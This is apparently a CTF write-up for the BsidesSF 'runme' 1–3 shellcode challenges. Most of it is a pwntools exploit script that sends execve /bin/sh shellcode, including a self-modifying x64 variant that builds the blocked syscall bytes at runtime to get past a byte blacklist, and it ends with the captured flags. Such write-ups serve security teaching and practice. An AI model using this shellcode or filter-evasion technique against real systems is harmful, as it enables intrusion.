## BsidesSF CTF: runme 1,2,3 [pwn]
##### *tl;dr: basic shellcode for 1 & 2, self-modifying shellcode for 3*

#### These series involved challenges revolving around the concept of shellcode. For the easier challenges (1, 2), we only had to provide a simple x64 shellcode which spawns a shell (1) and does not have null bytes in it (2).

#### What made the series interesting was the third challenge which blacklisted the bytes needed to make the `int 0x80` and `syscall` instructions. To solve this, I ported an existing [self-modifying shellcode](http://shell-storm.org/shellcode/files/shellcode-505.php) to an x64 version and did some slight adjustments on the calculations that are made. In summary, the shellcode finds a target sequence of bytes in our payload and performs some calculation in order to get the needed bytes, therefore bypassing the blacklist.

#### I got stumped for a while despite forming a proper execve shellcode, but realized what I was doing wrong. Note to self, execve requires a pointer to the /bin/sh string in memory instead of simply the contents in a register.

```python
from pwn import *

#: CONNECT TO CHALLENGE SERVERS
#p = process('./runme3')
#p = remote("runme-bc63cb99.challenges.bsidessf.net", 1337)
#p = remote("runme2-91ab7154.challenges.bsidessf.net", 1337)
p = remote("runme3-3f8ecff9.challenges.bsidessf.net", 1337)

#: GDB SETTINGS
breakpoints = ['break *main + 438']
#gdb.attach(p, gdbscript = '\n'.join(breakpoints))

#: PWN THY VULNS
context.arch = 'amd64'
#: for runme 1 & 2
#p.sendline(asm(shellcraft.sh()))

#: for runme 3
self_modifying_shellcode = asm('''

	_start:
		jmp _fuckaround_and_findout

	_scanbytes:
		pop rdx
		mov rsi, rdx

	_loopmakesyscall:
		mov rax, [rdx]
		cmpw ax, 0x3713
		jne _not_target
		subw ax, 0x3204
		mov [rdx], rax
		
	_not_target:
		inc dl
		cmp eax, 0x41414141
		jne _loopmakesyscall
		jmp rsi

	_fuckaround_and_findout:
		call _scanbytes

	_payload:
		xor rdx, rdx
		xor rdi, rdi
		xor rsi, rsi
		xor rax, rax
		push rax
		movabs rbx, 0x68732f2f6e69622f
		push rbx
		lea rdi, [rsp]
		mov al, 0x3b
		.ascii "\x13\x37"
		.ascii "AAAAAAAA"
	''')

#:
p.sendline(self_modifying_shellcode)
p.interactive()

#: CTF{welcome_to_shellcode}
#: CTF{welcome_to_shellcode_again}
#: CTF{welcome_to_shellcode_once_more}
```